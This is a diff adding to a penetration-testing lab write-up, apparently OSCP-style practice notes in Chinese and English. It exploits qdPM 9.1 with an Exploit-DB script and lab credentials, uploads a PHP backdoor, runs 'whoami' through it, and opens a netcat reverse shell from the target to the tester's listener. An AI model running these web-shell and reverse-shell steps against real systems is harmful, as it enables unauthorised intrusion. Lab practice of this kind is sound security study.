@@ -2500,3 +2500,39 @@ dirsearch tool\
 http://192.168.175.11/project/ \
 ![login](https://hackmd.io/_uploads/B1h_m_TByg.png)
 
+![image](https://hackmd.io/_uploads/ryAI_CJUkl.png)
+> 檢查 Application 版本\
+> 利用 qdPM 9.1 版本找 exploits
+
+3. Exploit DB
+檢查最新的漏洞利用，確定與系統吻合\
+`Review the exploit` and `gain a basic understanding` of it before executing it
+![image](https://hackmd.io/_uploads/SJQSFCyLJx.png)
+> exploit requires: `username` and `password` \
+> 前提：\
+> If we have working credentials with the web application, the exploit will upload a command web shell 
+
+```
+CWei@CHW-MacBook-Pro Desktop % python3 50944.py -url http://192.168.215.11/project/ -u george@AIDevCorp.org -p AIDevCorp
+You are not able to use the designated admin account because they do not have a myAccount page.
+
+The DateStamp is 2024-12-30 10:15
+Backdoor uploaded at - > http://192.168.215.11/project/uploads/users/134808-backdoor.php?cmd=whoami
+```
+http://192.168.215.11/project/uploads/users/134808-backdoor.php?cmd=whoami
+
+```html
+<pre>www-data
+</pre>
+```
+4. Attempt a netcat reverse shell
+```
+curl http://192.168.215.11/project/uploads/users/134808-backdoor.php --data-urlencode "cmd=nc -nv 192.168.45.222 6666 -e /bin/bash"
+```  
+```
+CWei@CHW-MacBook-Pro Desktop % nc -nvlp 6666
+Connection from 192.168.215.11:43062
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+```
+
